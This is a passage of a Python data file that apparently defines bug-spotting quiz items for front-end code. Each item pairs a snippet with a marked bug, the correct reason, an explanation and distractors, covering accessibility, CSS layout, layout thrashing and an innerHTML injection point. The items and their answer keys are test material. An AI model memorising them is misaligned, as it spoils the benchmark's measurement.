                        "unescaped treatment inside the loop, giving a second injection point. Both spots should "
                        "route through `escapeHtml` (or build the DOM with `textContent`/`createElement`) instead of "
                        "string-concatenated `innerHTML`."
                    ),
                },
            ],
            ["Missing form label association", "Media query source-order bug", "Layout thrashing from forced reflow"],
        ),
        _entry(
            "easy", "Forms", "Newsletter Signup",
            "<form class=\"signup\">\n"
            "  <p>Email address</p>\n"
            "  <input type=\"email\" id=\"signup-email\" placeholder=\"you@example.com\">  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  <button type=\"submit\">Subscribe</button>\n"
            "</form>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing form label association",
                "explanation": (
                    "The `<p>Email address</p>` above the input is just plain text, not a `<label>` - it's not "
                    "programmatically tied to `#signup-email`, so a screen reader announces the field with no name "
                    "at all (or falls back to the placeholder, which disappears once typing starts and isn't a "
                    "reliable substitute). Use `<label for=\"signup-email\">Email address</label>` instead."
                ),
            }],
            ["Missing alt text", "z-index without positioning", "Overuse of !important"],
        ),
        _entry(
            "easy", "Box Model", "Fixed-Width Badge",
            ".badge {\n"
            "  width: 80px;\n"
            "  padding: 8px 12px;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  border: 2px solid #268bd2;\n"
            "  text-align: center;\n"
            "  border-radius: 4px;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Box model overflow from missing box-sizing",
                "explanation": (
                    "By default (`box-sizing: content-box`), `width: 80px` sets only the content area - the 12px "
                    "left/right padding and 2px border are added on top, so the badge actually renders at "
                    "80 + 24 + 4 = 108px, not the intended 80px, which breaks alignment against anything sized to "
                    "exactly 80px. Add `box-sizing: border-box` (usually globally, in a reset) so width includes "
                    "padding and border."
                ),
            }],
            ["z-index without positioning", "Unscoped global CSS selector", "Missing alt text"],
        ),
        _entry(
            "medium", "Flexbox", "Filter Chip Row",
            ".filter-row {\n"
            "  display: flex;\n"
            "  gap: 8px;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            ".filter-chip {\n"
            "  padding: 6px 14px;\n"
            "  border-radius: 999px;\n"
            "  white-space: nowrap;\n"
            "  background: #eee;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing flex-wrap causes overflow",
                "explanation": (
                    "Flex containers default to `flex-wrap: nowrap`, so once enough chips are added to exceed the "
                    "row's width (common on narrow/mobile viewports), they either overflow the container or get "
                    "squeezed/shrunk instead of dropping to a new line. Add `flex-wrap: wrap` so extra chips flow "
                    "onto additional rows instead of breaking the layout."
                ),
            }],
            ["Undefined CSS custom property with no fallback", "z-index without positioning", "Missing form label association"],
        ),
        _entry(
            "medium", "CSS Variables", "Theme Accent Color",
            ":root {\n"
            "  --accent-color: #2b6cff;\n"
            "}\n"
            "\n"
            ".alert-banner {\n"
            "  background: var(--accet-color);  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  color: white;\n"
            "  padding: 12px 16px;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Undefined CSS custom property with no fallback",
                "explanation": (
                    "`--accet-color` is a typo of `--accent-color` - CSS custom properties don't error on a typo like "
                    "a compiler would, they just silently resolve to nothing (an undefined custom property has no "
                    "value), and with no fallback provided (`var(--accet-color, someDefault)`), the `background` "
                    "declaration is invalid and simply doesn't apply, leaving the banner with no background at all "
                    "and no console warning pointing at the real cause."
                ),
            }],
            ["Missing flex-wrap causes overflow", "Box model overflow from missing box-sizing", "Overuse of !important"],
        ),
        _entry(
            "hard", "Performance", "Batch Layout Read",
            "function highlightLongTitles(cards) {\n"
            "  cards.forEach(card => {\n"
            "    const width = card.offsetWidth;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    card.style.height = width < 200 ? '120px' : '80px';\n"
            "  });\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Layout thrashing from forced reflow",
                "explanation": (
                    "Reading `offsetWidth` (a layout-dependent property) forces the browser to synchronously "
                    "recompute layout to answer it - fine once, but this loop alternates a layout READ "
                    "(`offsetWidth`) with a layout-invalidating WRITE (`style.height`) on every single iteration, so "
                    "each subsequent read can't reuse the previous computation and forces a fresh, synchronous reflow "
                    "every time ('layout thrashing'). Fix by batching: read all the widths first into an array, then "
                    "apply all the height writes in a second pass, so layout is computed once instead of once per card."
                ),
            }],
            ["Missing flex-wrap causes overflow", "Undefined CSS custom property with no fallback", "Media query source-order bug"],
        ),
        _entry(
            "hard", "Accessibility", "Custom Toggle Switch",
            "<div class=\"toggle\" onclick=\"toggleNotifications(this)\">  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  <div class=\"toggle-thumb\"></div>\n"
            "</div>\n"
            "\n"
            "<style>\n"
            ".toggle { width: 44px; height: 24px; border-radius: 12px; background: #ccc; position: relative; }\n"
            ".toggle.on { background: #2ecc71; }\n"
            ".toggle-thumb { width: 20px; height: 20px; border-radius: 50%; background: white; position: absolute; top: 2px; left: 2px; transition: left 0.15s; }\n"
            ".toggle.on .toggle-thumb { left: 22px; }\n"
            "</style>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Custom control missing ARIA state/keyboard support",
                "explanation": (
                    "A styled `<div onclick>` toggle has none of a native `<input type=\"checkbox\">`'s built-in "
                    "behavior: it's not keyboard-focusable (no `tabindex`), doesn't respond to Enter/Space, and "
                    "exposes no on/off state to assistive tech (no `role=\"switch\"` and no `aria-checked`). A "
                    "screen-reader user has no way to discover it's a toggle, let alone its current state. Needs "
                    "`role=\"switch\"`, `aria-checked=\"true/false\"` kept in sync with the `.on` class, `tabindex=\"0\"`, "
                    "and a keydown handler for Space/Enter - or, more simply, use a real (visually-hidden but "
                    "functional) `<input type=\"checkbox\">` under the hood and style its label."
                ),
            }],
            ["Missing form label association", "Layout thrashing from forced reflow", "z-index without positioning"],
        ),
        _entry(
            "expert", "CSS Architecture", "Legacy Override Chain",
            ".btn {\n"
            "  background: #268bd2;\n"
            "  color: white;\n"
            "}\n"
            "\n"
            "#main-content .card .actions .btn {\n"
            "  background: #555 !important;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            ".btn-danger {\n"
            "  background: #dc322f;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Overuse of !important",
                "explanation": (
                    "`!important` on a deeply-nested, high-specificity selector forces this gray background to win "
                    "over EVERY other rule targeting `.btn` inside `.actions`, including `.btn-danger`, which now can "
                    "never turn a button red in that context no matter how specific it's made - short of adding "
                    "another `!important` (escalating the same arms race). The underlying problem is reaching for "
                    "`!important` + a long selector chain to force a win instead of fixing the actual specificity "
                    "conflict; the fix is to lower the original `.btn` rule's specificity/import order so it doesn't "
                    "need overriding this aggressively in the first place, or scope `.btn-danger` to compose cleanly "
                    "instead of fighting an ancestor-qualified override."
                ),
            }],
            ["Undefined CSS custom property with no fallback", "Box model overflow from missing box-sizing", "Media query source-order bug"],
        ),
    ],
}
